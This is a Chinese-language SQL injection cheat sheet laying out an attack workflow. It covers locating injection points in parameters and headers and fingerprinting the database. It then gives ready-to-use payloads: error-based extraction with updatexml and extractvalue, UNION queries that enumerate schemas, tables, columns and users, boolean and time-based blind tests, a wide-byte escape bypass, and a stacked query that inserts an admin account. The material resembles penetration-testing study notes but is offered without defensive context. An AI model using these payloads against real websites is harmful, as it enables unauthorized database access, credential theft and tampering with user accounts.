# 一、思路

## 1、判断注入点

在GET参数、POST参数、以及HTTP头部等，包括Cookie、Referer、XFF(X-Forwarded-for)、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。

1）、GET 注入
提交数据的方式是 GET，注入点的位置在 GET 参数部分。例如有这样的一个URL：http://xxx.com/news.php?id=1，id是注入点。

2）、POST 注入
使用 POST 方式提交数据，注入点位置在 POST 数据部分，通常发生在表单中。

3）、HTTP 头部注入
注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中，Cookie 字段中等。

## 2、判断数据库类型
判断网站使用的是哪个数据库，常见数据库如：MySQL、MSSQL(SQLserver)、Oracle、Access、PostgreSQL、BD2等等。

* nmap 端口扫描

  | 数据库类型 | 默认端口号 |
  | ---------- | ---------- |
  | Oracle     | 1521       |
  | SQL Server | 1433       |
  | MySQL      | 3306       |
  | PostgreSql | 5432       |

| 网站类型 | 数据库类型         |
| -------- | ------------------ |
| asp      | SQL Server，Access |
| .net     | SQL Server         |
| php      | Mysql，PostgreSql  |
| java     | Oracle，Mysql      |

| 数据库类型                | 特有的系统表              |
| ------------------------- | ------------------------- |
| Oracle                    | SYS.USER_TABLES           |
| SQL Server                | SYSOBJECTS                |
| MySQL(MySQL版本在5.0以上) | INFORMATION_SCHEMA.TABLES |
| Access                    | MSYSOBJECTS               |

## 2、有回显

* 报错查询

  1. exp: and/or exp(~(select * from (select user () ) a) );
  2. updatexml: and/or(updatexml(1,concat(0x7e,(select database()),0x7e),1))
  3. extractvalue: extractvalue(1,concat(0x7e,version(),0x7e))

* 联合查询

  1. 确定列数：union select 1,2,3#
  2. 确定回显列：比如查出来 1，2 那就在1，2上进行查询
  3. 确定数据库：union select  database() ,2,3#
  4. 确定表：union select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schema=database()#
  5. 确定列：union select (group_concat(column_name)),2,3 from information_schema.columns where table_name=' '#
  6. 确定用户：union select 1,group_concat(user),3 from ' '#
     * information_schema.schemata           #information_schema下面的所有数据库名
     * information_schema.tables			#information_schema下面的所有表名
     * information_schema.columns		    #information_schema下面所有的列名
     * table_name										                             #表名
     * column_name										                         #列名
     * table_schema									                          #数据库名
     * schema_name                                                                                             #数据库列表名

* 基于报错bool盲注

  and ascii(substr(database(),1,1))=115

## 3、无回显

* 基于时间bool盲注

  1. 数据库：if(ascii(substr(database(),1,1))=114,1,sleep(5))#

  2. 表if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=114,1,sleep(5))#

     LIMIT 0,1 → 获取第一张表（如 'users'） LIMIT 1,1 → 获取第二张表（如 'products'）

## 4、其他

* 宽字节：'被转义为\'/       %df'   
* 堆叠：id=1'; insert into users values('admin','password')#